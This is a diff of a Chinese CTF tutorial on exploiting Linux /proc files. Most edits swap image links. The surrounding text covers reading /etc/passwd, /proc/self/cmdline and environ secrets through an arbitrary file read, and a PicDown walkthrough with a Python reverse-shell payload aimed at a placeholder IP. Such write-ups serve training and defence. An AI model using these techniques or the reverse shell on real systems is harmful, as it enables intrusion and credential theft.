@@ -6,7 +6,7 @@
 
 > 简单一点来讲，`/proc`目录就是保存在系统中的信息，其包含许多以数字命名的子目录，这些数字代表着当前系统正在运行进程的进程号，里面包含对应进程相关的多个信息文件
 
-![](https://p5.ssl.qhimg.com/t016cde6f54fb290fa1.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115457-9f2fb7c6-4e6c-1.png)
 
 > 一般来说，在`/proc`目录下会存在以下的文件和目录
 
@@ -61,7 +61,7 @@
 # /proc/pid 目录下常见的文件介绍
 > 在前面的图中不难看出在`/proc`目录下存在很多与进程相关的目录，接着来看看`/proc/pid`中记录的几个经常用到的进程的信息
 
-![](https://p3.ssl.qhimg.com/t015cfc8f239b7b6148.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115513-a885d134-4e6c-1.png)
 
 ## attr
 > `/proc/pid/attr`是一个目录，这个目录下的文件的作用是为安全模块提供了`API`，通过这些文件可以读取或者设置一些安全相关的选项，需要注意的是，只有内核开启了`CONFIG_SECURITY`选项时才能够看到这个目录
@@ -87,7 +87,7 @@
     如果一个进程向这个文件写入安全上下文, 那么之后所有的 sockets 的创建行为都会在此进程上下文中
 ```
 
-![](https://p2.ssl.qhimg.com/t011be28f84b6f820b1.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115544-bb26eac6-4e6c-1.png)
 
 ## cmdline
 > `cmdline`文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息，可以通过查看`cmdline`目录获取启动指定进程的完整命令，例如：`cat /proc/pid/cmdline`
@@ -95,19 +95,19 @@
 ## cwd
 > 这是一个当前的进程的工作目录，可以通过查看`cwd`文件获取目标指定进程环境的运行目录，例如：`cd /proc/pid/cwd; /bin/pwd`或者`ls -al /proc/pwd/cwd`
 
-![](https://p4.ssl.qhimg.com/t01e420b7106b8ba7f1.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115600-c4c8093e-4e6c-1.png)
 
 ## exe
 > `exe`是一个指向启动当前进程的可执行文件(完整路径)的符号链接，通过`exe`文件可以获得指定进程的可执行文件的完整路径
 
-![](https://p4.ssl.qhimg.com/t01b25edbf8330f16d8.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115614-cce0b896-4e6c-1.png)
 
 > 在`Linux2.2`的内核及其之后`/proc/pid/exe`是直接执行的二进制文件的符号链接，在`Linux2.0`及其之前`/proc/pid/exe`是指向当前进程执行的二进制文件
 
 ## environ
 > 该文件存储着当前进程的环境变量列表，包含的是当程序使用`execve`启动程序时的环境变量的值，其中的`entries`是通过`0x0`分割的，结尾是可能是`NULL`，彼此间用空字符(NULL)隔开，变量用大写字母表示，其值用小写字母表示，可以通过查看`environ`目录来获取指定进程的环境变量信息，在 CTF 赛题中可以用来读取环境变量中的`FLAG`或者`SECRET_KEY`
 
-![](https://p4.ssl.qhimg.com/t018d4f7c3f338bcc1e.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115629-d5b9b274-4e6c-1.png)
 
 ## fd
 > 这是一个子目录，包含了当前进程打开的每一个文件，每一个条目都是一个文件描述符，这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里，可以通过`fd`目录里的文件获得指定进程打开的每个文件的路径以及文件内容
@@ -122,9 +122,9 @@
     ls -al /proc/pid/fd/id
 ```
 
-![](https://p2.ssl.qhimg.com/t016d3e4a093424d993.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115642-ddccc96a-4e6c-1.png)
 
-![](https://p0.ssl.qhimg.com/t01617016f07cd7b370.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115657-e6d2e512-4e6c-1.png)
 
 ## self
 > 在 CTF 赛题中往往需要的都是当前进程中的有用信息，而在上述的操作中基本都是目标环境中指定的进程信息，这时可以通过`/proc/self`来获取当前进程的信息，相较于`/proc/$pid`，`/proc/self`不仅能够更方便的获取本进程的信息，还可以避免在`fork`和`daemon`等情况下`pid`发生变化，感兴趣的话可以看看[stackexchange上的讨论](https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for)
@@ -148,12 +148,12 @@
 ```
 > tip：当找不到网站路径的时候可以利用`/proc/self/cwd`目录来读取`apache`进程的`php`文件源码
 
-![](https://p3.ssl.qhimg.com/t010892e7162961ae60.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115719-f398181c-4e6c-1.png)
 
 # 例题实战 - PicDown
 > 打开题目界面只有一个登录框，随便输入点东西后发现`url`的形式可能存在任意文件读取，尝试后成功下载`/etc/passwd`
 
-![](https://p1.ssl.qhimg.com/t01c0ac7b0684cd059d.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115736-fe333752-4e6c-1.png)
 
 > 既然可以下载`/etc/passwd`，且题目也没有其它利用点，尝试利用`/proc/self/cmdline`来获取当前文件的名字：`python2 app.py`
 
@@ -224,11 +224,8 @@ GET:
 no_one_know_the_manager?key=IEcyndyXL52M6OSfyKnmz3kMIqePrpuHJVUs88J01Ko=&shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-![](https://p2.ssl.qhimg.com/t0182d9194e04772ced.png)
+![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115758-0b4f656e-4e6d-1.png)
 
 # 小结
 > 在 CTF 赛题中，`/proc`在 Web-Python 类型赛题较为常见，利用方式也有很多，除了上面实战例题中的利用方式，有时候还会通过`/proc/self/environ`来获取有用信息，或者利用`/proc`和`LFI`进行`Getshell`等等
 > 在渗透测试过程中，获取内存信息(cat /proc/meminfo)、CPU 信息(cat /proc/cpuinfo)等时候，也经常会用到`/proc`目录；在进行`php`文件包含姿势的利用时往往也会用到包含`/proc/self/environ`文件这个点
-
-# 参考文章
-> [Proc 目录在 CTF 中的利用](https://www.anquanke.com/post/id/241148)
